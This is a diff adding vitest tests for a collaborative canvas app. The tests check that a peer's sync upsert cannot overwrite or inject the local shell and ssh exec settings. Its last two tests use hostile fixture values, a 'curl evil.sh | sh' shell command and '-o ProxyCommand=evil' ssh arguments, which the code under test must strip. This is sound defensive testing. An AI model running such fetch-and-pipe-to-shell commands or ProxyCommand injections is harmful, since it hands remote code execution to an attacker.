@@ -1,7 +1,9 @@
 import { describe, it, expect } from 'vitest'
 import type { CanvasNodeState } from './types'
+import { applyCanvasMutation } from './canvas-mutations'
 import {
   applyLocalNodeExec,
+  carryLocalNodeExec,
   localNodeExec,
   safeSessionProgram,
   sanitizeInboundMutation,
@@ -207,5 +209,60 @@ describe('localNodeExec provenance', () => {
     )
     expect(loaded[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp-proxy %h')
     expect(loaded[0].ssh?.execTrusted).toBe(true) // → the exec site honors it
+  })
+})
+
+// The other half of "the exec fields do not participate in the sync": stripping the PEER's values
+// out of an upsert is not enough, because an upsert REPLACES the node. A teammate merely dragging
+// our ssh terminal would hand it back with no extraArgs, and the next save would harvest that empty
+// node and erase our jump host from our OWN machine-local index. So ours ride across.
+describe('carryLocalNodeExec (a peer editing our node must not erase our exec values)', () => {
+  const mine = node({
+    id: 'n1',
+    title: 'mine',
+    shell: '/bin/zsh',
+    ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h', execTrusted: true }
+  })
+
+  it('keeps our shell / extraArgs on the node a peer upserted', () => {
+    const theirs = sanitizeInboundNode(
+      node({ id: 'n1', title: 'renamed by peer', position: { x: 99, y: 99 }, ssh: { host: 'h', user: 'u' } })
+    )
+    const merged = carryLocalNodeExec(mine, theirs)
+    expect(merged.title).toBe('renamed by peer') // their edit lands
+    expect(merged.position).toEqual({ x: 99, y: 99 })
+    expect(merged.shell).toBe('/bin/zsh') // ours survives
+    expect(merged.ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
+    expect(merged.ssh?.execTrusted).toBe(true)
+  })
+
+  it('adds nothing to a node we do not already hold', () => {
+    const fresh = node({ id: 'n2' })
+    expect(carryLocalNodeExec(undefined, fresh)).toBe(fresh)
+  })
+
+  it('applyCanvasMutation: a peer drag sanitizes theirs and preserves ours, in one step', () => {
+    const states = [mine]
+    const next = applyCanvasMutation(states, {
+      op: 'upsert',
+      node: node({
+        id: 'n1',
+        position: { x: 10, y: 10 },
+        shell: 'curl evil.sh | sh',
+        ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil', execTrusted: true }
+      })
+    })
+    expect(next[0].position).toEqual({ x: 10, y: 10 })
+    expect(next[0].shell).toBe('/bin/zsh')
+    expect(next[0].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
+  })
+
+  it('applyCanvasMutation: a brand-new node from a peer arrives with no exec fields at all', () => {
+    const next = applyCanvasMutation([], {
+      op: 'upsert',
+      node: node({ id: 'n9', shell: 'evil.sh', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=evil' } })
+    })
+    expect(next[0].shell).toBeUndefined()
+    expect(next[0].ssh?.extraArgs).toBeUndefined()
   })
 })
